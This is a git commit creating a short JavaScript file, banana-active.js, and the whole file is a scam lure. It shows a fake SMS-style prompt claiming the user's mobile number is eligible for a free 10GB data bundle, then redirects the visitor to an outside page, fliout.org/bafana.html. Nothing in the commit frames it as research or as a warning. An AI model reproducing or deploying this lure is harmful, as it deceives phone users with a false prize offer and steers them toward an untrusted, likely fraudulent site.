7843e7bc7ec5f273ac83306481c1ab34b6a9baa2
ukpeha505-rgb <ukpeha505@gmail.com>
2026-01-04 15:07:10 +0100

    Create banana-active.js

---
+++ banana-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS: Congratulations, your mobile number is eligible to receive 10GB, click OK to Select your network','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://fliout.org/bafana.html';
+}
